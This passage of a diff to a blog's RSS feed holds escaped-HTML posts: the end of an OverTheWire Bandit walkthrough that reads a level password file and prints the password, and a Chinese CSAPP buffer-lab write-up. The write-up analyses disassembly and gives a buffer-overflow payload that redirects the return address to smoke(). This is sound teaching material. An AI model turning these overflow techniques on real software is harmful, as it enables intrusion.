+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;$ ls
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;uppershell
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;$ cat /etc/bandit_pass/bandit33
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;odHo63fHiFqcWWJG9rLiLDtPm45KzUKy
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;</description>
+        </item>
+        <item>
+        <title>CSAPP:buffer实验</title>
+        <link>chenyuan1125.github.io/p/csappbuffer%E5%AE%9E%E9%AA%8C/</link>
+        <pubDate>Sun, 06 Oct 2024 00:00:00 +0000</pubDate>
+        
+        <guid>chenyuan1125.github.io/p/csappbuffer%E5%AE%9E%E9%AA%8C/</guid>
+        <description>&lt;img src="chenyuan1125.github.io/chenyuan1125.github.io/p/csappbuffer%E5%AE%9E%E9%AA%8C/1.jpg" alt="Featured image of post CSAPP:buffer实验" /&gt;&lt;h1 id=&#34;buffer实验&#34;&gt;buffer实验
+&lt;/h1&gt;&lt;h3 id=&#34;level-0-candle&#34;&gt;Level 0: Candle
+&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;目标：执行 smoke()，而不是让 getbuf() 返回 1。&lt;/strong&gt;&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kt&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;test&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	&lt;span class=&#34;kt&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;val&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	&lt;span class=&#34;cm&#34;&gt;/* Put canary on stack to detect possible corruption */&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	&lt;span class=&#34;k&#34;&gt;volatile&lt;/span&gt; &lt;span class=&#34;kt&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;local&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;uniqueval&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	&lt;span class=&#34;n&#34;&gt;val&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;getbuf&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	    &lt;span class=&#34;cm&#34;&gt;/* Check for corrupted stack */&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	    &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;local&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;!=&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;uniqueval&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;())&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;		&lt;span class=&#34;nf&#34;&gt;printf&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;Sabotaged!: the stack has been corrupted&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\n&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	&lt;span class=&#34;k&#34;&gt;else&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;val&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;cookie&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;		&lt;span class=&#34;nf&#34;&gt;printf&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;Boom!: getbuf returned 0x%x&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\n&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;val&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;		&lt;span class=&#34;nf&#34;&gt;validate&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	&lt;span class=&#34;k&#34;&gt;else&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;		&lt;span class=&#34;nf&#34;&gt;printf&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;Dud: getbuf returned 0x%x&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\n&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;val&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;在&lt;code&gt;bufboms.s&lt;/code&gt;的第 363 行找到了 smoke 的地址 08048c18：&lt;/p&gt;
+&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://billc.oss-cn-shanghai.aliyuncs.com/img/2020-04-13-163943.png&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;&lt;img src=&#34;https://billc.oss-cn-shanghai.aliyuncs.com/img/2020-04-13-163943.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;图1&#34;
+	
+	
+&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;再研究 test 的部分汇编代码：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-s&#34; data-lang=&#34;s&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; &lt;span class=&#34;m&#34;&gt;08048&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;daa&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;test&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;gt;:&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; &lt;span class=&#34;m&#34;&gt;8048&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;daa&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt;	&lt;span class=&#34;m&#34;&gt;55&lt;/span&gt;                   	&lt;span class=&#34;n&#34;&gt;push&lt;/span&gt;   &lt;span class=&#34;o&#34;&gt;%ebp
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt; 8048dab:	89 e5                	mov    %&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;esp&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;%ebp
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt; 8048dad:	53                   	push   %&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ebx&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; &lt;span class=&#34;m&#34;&gt;8048&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;dae&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt;	&lt;span class=&#34;m&#34;&gt;83&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ec&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;24&lt;/span&gt;             	&lt;span class=&#34;n&#34;&gt;sub&lt;/span&gt;    &lt;span class=&#34;o&#34;&gt;$&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0x24&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;%esp
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt; 8048db1:	e8 da ff ff ff       	call   8048d90 &amp;lt;uniqueval&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt; 8048db6:	89 45 f4             	mov    %&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;eax&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;-0&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;xc&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;%ebp)
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt; 8048db9:	e8 36 04 00 00       	call   80491f4 &amp;lt;getbuf&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt; 8048dbe:	89 c3                	mov    %&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;eax&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;%&lt;span class=&#34;n&#34;&gt;ebx&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; &lt;span class=&#34;m&#34;&gt;8048&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;dc0&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt;	&lt;span class=&#34;n&#34;&gt;e8&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;cb&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ff&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ff&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ff&lt;/span&gt;       	&lt;span class=&#34;n&#34;&gt;call&lt;/span&gt;   &lt;span class=&#34;m&#34;&gt;8048&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;d90&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;uniqueval&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;getbuff:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-s&#34; data-lang=&#34;s&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;m&#34;&gt;080491&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;f4&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;getbuf&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;gt;:&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; &lt;span class=&#34;m&#34;&gt;80491&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;f4&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt;	&lt;span class=&#34;m&#34;&gt;55&lt;/span&gt;                   	&lt;span class=&#34;n&#34;&gt;push&lt;/span&gt;   &lt;span class=&#34;o&#34;&gt;%ebp
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt; 80491f5:	89 e5                	mov    %&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;esp&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;%ebp
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt; 80491f7:	83 ec 38             	sub    $0x38,%&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;esp&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; &lt;span class=&#34;m&#34;&gt;80491&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;fa&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt;	&lt;span class=&#34;m&#34;&gt;8&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;d&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;45&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;d8&lt;/span&gt;             	&lt;span class=&#34;n&#34;&gt;lea&lt;/span&gt;    &lt;span class=&#34;m&#34;&gt;-0&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;x28&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;%ebp),%&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;eax&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; &lt;span class=&#34;m&#34;&gt;80491&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;fd&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt;	&lt;span class=&#34;m&#34;&gt;89&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;04&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;24&lt;/span&gt;             	&lt;span class=&#34;n&#34;&gt;mov&lt;/span&gt;    &lt;span class=&#34;o&#34;&gt;%eax,(%&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;esp&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; &lt;span class=&#34;m&#34;&gt;8049200&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt;	&lt;span class=&#34;n&#34;&gt;e8&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;f5&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;fa&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ff&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ff&lt;/span&gt;       	&lt;span class=&#34;n&#34;&gt;call&lt;/span&gt;   &lt;span class=&#34;m&#34;&gt;8048&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;cfa&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Gets&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; &lt;span class=&#34;m&#34;&gt;8049205&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt;	&lt;span class=&#34;n&#34;&gt;b8&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;01&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;00&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;00&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;00&lt;/span&gt;       	&lt;span class=&#34;n&#34;&gt;mov&lt;/span&gt;    &lt;span class=&#34;o&#34;&gt;$&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0x1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;%&lt;span class=&#34;n&#34;&gt;eax&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; &lt;span class=&#34;m&#34;&gt;804920&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt;	&lt;span class=&#34;n&#34;&gt;c9&lt;/span&gt;                   	&lt;span class=&#34;n&#34;&gt;leave&lt;/span&gt;  
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; &lt;span class=&#34;m&#34;&gt;804920&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;b&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt;	&lt;span class=&#34;n&#34;&gt;c3&lt;/span&gt;                   	&lt;span class=&#34;n&#34;&gt;ret&lt;/span&gt;  
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;可以看到 lea 把 buf 的指针地址 (-0x28 (% ebp)) 传给了 Gets ()，0x28 也就是十进制的 40 个字节。而 ebp 占了 4 个字节，buf 距离 getbuff 的返回地址还有 44 个字节。&lt;/p&gt;
+&lt;table&gt;
+  &lt;thead&gt;
+      &lt;tr&gt;
+          &lt;th style=&#34;text-align: left&#34;&gt;返回地址&lt;/th&gt;
+          &lt;th style=&#34;text-align: left&#34;&gt;需要修改的地址&lt;/th&gt;
+      &lt;/tr&gt;
+  &lt;/thead&gt;
+  &lt;tbody&gt;
+      &lt;tr&gt;
+          &lt;td style=&#34;text-align: left&#34;&gt;ebp&lt;/td&gt;
+          &lt;td style=&#34;text-align: left&#34;&gt;- 占用4字节&lt;/td&gt;
+      &lt;/tr&gt;
+      &lt;tr&gt;
+          &lt;td style=&#34;text-align: left&#34;&gt;&amp;hellip;&lt;/td&gt;
+          &lt;td style=&#34;text-align: left&#34;&gt;&amp;hellip;&lt;/td&gt;
+      &lt;/tr&gt;
+      &lt;tr&gt;
+          &lt;td style=&#34;text-align: left&#34;&gt;ebp - 40 字节&lt;/td&gt;
+          &lt;td style=&#34;text-align: left&#34;&gt;buf 数组的初始地址&lt;/td&gt;
+      &lt;/tr&gt;
+      &lt;tr&gt;
+          &lt;td style=&#34;text-align: left&#34;&gt;&amp;hellip;&lt;/td&gt;
+          &lt;td style=&#34;text-align: left&#34;&gt;&amp;hellip;&lt;/td&gt;
+      &lt;/tr&gt;
+      &lt;tr&gt;
+          &lt;td style=&#34;text-align: left&#34;&gt;ebp - 0x38&lt;/td&gt;
+          &lt;td style=&#34;text-align: left&#34;&gt;esp，栈帧首地址&lt;/td&gt;
+      &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
+&lt;p&gt;从文档中得知：&lt;/p&gt;
+&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://billc.oss-cn-shanghai.aliyuncs.com/img/2020-04-13-163946.png&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;&lt;img src=&#34;https://billc.oss-cn-shanghai.aliyuncs.com/img/2020-04-13-163946.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;图2&#34;
+	
+	
+&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;Gets 函数不验证是否超出了 &lt;code&gt;NORMAL_BUFFER_SIZE&lt;/code&gt;，所以超出字符的就会覆盖掉内存。&lt;/p&gt;
+&lt;p&gt;那么只要在 buf 开始处随便填入 44 字节（0a 除外，会终止输入），然后在后面加入 smoke 的地址，覆盖掉栈中的返回地址即可。&lt;/p&gt;
+&lt;p&gt;另外需要注意的是 x86 机器为小端法机器，最低有效字节在内存的前面，所以在 exploit.txt 中填入如下答案即可：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;00 00 00 00 00 00 00 00
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;00 00 00 00 00 00 00 00
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;00 00 00 00 00 00 00 00
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;00 00 00 00 00 00 00 00
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;00 00 00 00 00 00 00 00
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;00 00 00 00 18 8c 04 08
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
